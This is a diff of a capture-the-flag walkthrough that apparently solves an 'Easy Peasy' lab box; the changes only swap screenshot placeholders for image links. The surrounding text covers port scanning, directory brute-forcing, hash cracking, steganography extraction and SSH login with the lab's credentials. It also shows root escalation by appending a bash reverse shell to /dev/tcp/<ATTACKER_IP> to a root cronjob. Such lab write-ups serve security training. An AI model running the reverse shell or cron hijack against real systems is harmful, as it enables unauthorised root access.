@@ -15,7 +15,7 @@ This command performs:
 - `-p-`: Scans all 65535 ports
 - `-sV`: Version detection to identify services running on open ports
 
-[SCREEN01]
+<img width="767" height="231" alt="SCREEN01" src="https://github.com/user-attachments/assets/d18f59c1-af08-4172-9e1f-6d13a43d8efc" />
 
 ### How many ports are open?
 
@@ -49,7 +49,7 @@ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/SecLists/Discovery/We
 gobuster dir -u http://<TARGET_IP>/hidden -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 ```
 
-[SCREEN02]
+<img width="922" height="357" alt="SCREEN02" src="https://github.com/user-attachments/assets/758d8e09-006a-4ffb-8714-5e2958f8b897" />
 
 3. The scan reveals a `/whatever` subdirectory within `/hidden`.
 
@@ -57,11 +57,11 @@ gobuster dir -u http://<TARGET_IP>/hidden -w /usr/share/wordlists/SecLists/Disco
 
 5. In the HTML source code, you'll find the first flag encoded in Base64.
 
-[SCREEN03]
+<img width="804" height="386" alt="SCREEN03" src="https://github.com/user-attachments/assets/8bf03ba5-25f4-4b78-9e22-9eca5c6f14e4" />
 
 6. Copy the Base64 string and decode it using [CyberChef](https://gchq.github.io/CyberChef/) with the "From Base64" operation.
 
-[SCREEN04]
+<img width="528" height="531" alt="SCREEN04" src="https://github.com/user-attachments/assets/57b2d206-298a-48f4-b49f-9cd419a2dbc4" />
 
 ---
 
@@ -88,7 +88,7 @@ This Flag Can Enter But Only This Flag No More Exceptions
 
 4. Use [MD5Hashing.net](https://md5hashing.net) or a similar MD5 decryption service to crack the hash.
 
-[SCREEN05]
+<img width="1108" height="234" alt="SCREEN05" src="https://github.com/user-attachments/assets/f276b64a-8f84-4aef-9723-47d4c0a2d1e7" />
 
 ---
 
@@ -96,7 +96,7 @@ This Flag Can Enter But Only This Flag No More Exceptions
 
 1. Inspect the `http://<TARGET_IP>:65524/` page to find Flag 3.
 
-[SCREEN06]
+<img width="1098" height="722" alt="SCREEN06" src="https://github.com/user-attachments/assets/5a6baa1a-3c72-467b-97bc-783fe1fcf024" />
 
 ---
 
@@ -108,7 +108,7 @@ This Flag Can Enter But Only This Flag No More Exceptions
 
 3. This string is encoded in Base62. Use [CyberChef](https://gchq.github.io/CyberChef/) with the "From Base62" operation.
 
-[SCREEN07]
+<img width="514" height="524" alt="SCREEN07" src="https://github.com/user-attachments/assets/5f5e0cf6-da52-42d1-a5db-eb25a777a348" />
 
 4. The decoded value reveals the **hidden directory path**: `/n0th1ng3ls3m4tt3r`.
 
@@ -120,7 +120,7 @@ _GOST Hash john --wordlist=easypeasy.txt --format=gost hash (optional\* Delete d
 
 1. Navigate to `http://<TARGET_IP>:65524/n0th1ng3ls3m4tt3r/` to find a GOST hash.
 
-[SCREEN0]
+<img width="1037" height="232" alt="SCREEN08" src="https://github.com/user-attachments/assets/90ba4c9c-ecbf-44d5-ae4e-7d3b9fa3c414" />
 
 2. Copy the hash value displayed on the page and save it to a file:
 
@@ -136,7 +136,7 @@ john --wordlist=easypeasy_1596838725703.txt --format=gost hash.txt
 
 **Password**: `mypasswordforthatjob`
 
-[SCREEN09]
+<img width="778" height="221" alt="SCREEN09" src="https://github.com/user-attachments/assets/53e83c18-2b66-40f1-9ccf-b745ddf53621" />
 
 ---
 
@@ -150,7 +150,7 @@ john --wordlist=easypeasy_1596838725703.txt --format=gost hash.txt
 stegseek binarycodepixabay.jpg easypeasy_1596838725703.txt
 ```
 
-[SCREEN10]
+<img width="515" height="129" alt="SCREEN10" src="https://github.com/user-attachments/assets/a73c7a00-c9bb-4f2f-8cca-5753181fdf33" />
 
 3. Stegseek will extract the hidden data to `binarycodepixabay.jpg.out`. The output file contains:
 
@@ -162,7 +162,7 @@ password:
 
 5. The password is encoded in binary. Use [CyberChef](https://gchq.github.io/CyberChef/) with the "From Binary" operation.
 
-[SCREEN11]
+<img width="1679" height="521" alt="SCREEN11" src="https://github.com/user-attachments/assets/b38b664b-d612-4a5b-ab91-bd3c30c1f785" />
 
 **SSH Username**: `boring`  
 **SSH Password**: `iconvertedmypasswordtobinary`
@@ -183,11 +183,11 @@ ssh boring@<TARGET_IP> -p 6498
 cat user.txt
 ```
 
-[SCREEN12]
+<img width="744" height="389" alt="SCREEN12" src="https://github.com/user-attachments/assets/899f619f-f1b5-49c1-8e9c-c185195f4491" />
 
 4. The flag is encoded using ROT13. Use [CyberChef](https://gchq.github.io/CyberChef/) with the "ROT13" operation to decode it.
 
-[SCREEN13]
+<img width="506" height="525" alt="SCREEN13" src="https://github.com/user-attachments/assets/e80806a9-b5d3-401e-9275-a0383fb97a87" />
 
 ---
 
@@ -199,7 +199,7 @@ cat user.txt
 cat /etc/crontab
 ```
 
-[SCREEN14]
+<img width="824" height="276" alt="SCREEN14" src="https://github.com/user-attachments/assets/a43c7787-c707-4c1a-a782-ac46e9c7d5f0" />
 
 2. You'll find a cronjob running as root that executes `/var/www/.mysecretcronjob.sh` at regular intervals.
 
@@ -216,7 +216,7 @@ cat /var/www/.mysecretcronjob.sh
 echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /var/www/.mysecretcronjob.sh
 ```
 
-[SCREEN15]
+<img width="845" height="156" alt="SCREEN15" src="https://github.com/user-attachments/assets/ee6d6639-4636-493b-b4a9-a86312bd5d50" />
 
 7. Wait for the cronjob to execute. You should receive a reverse shell connection as the root user.
 
@@ -226,4 +226,4 @@ echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /var/www/.mysecretcronjob.
 cat /root/.root.txt
 ```
 
-[SCREEN16]
+<img width="643" height="422" alt="SCREEN16" src="https://github.com/user-attachments/assets/f931c4ef-2cc4-42b3-adde-c2f2ec2cd7cb" />
